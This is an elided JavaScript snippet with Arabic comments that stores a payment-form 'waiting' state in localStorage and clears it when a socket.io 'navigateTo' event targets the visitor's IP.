...
$(document).ready(function() {
    ...
    // استعادة حالة الانتظار من LocalStorage
    const isWaiting = localStorage.getItem('isWaiting_paymen') === 'true';
    if (isWaiting) {
    ...
    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
        if (window.visitorIP === targetIp) {
            // إلغاء حالة الانتظار من LocalStorage
            localStorage.removeItem('isWaiting_paymen');
    ...
    $("#paymentForm").on("submit", function(e) {
        ...
        localStorage.setItem('isWaiting_paymen', 'true');
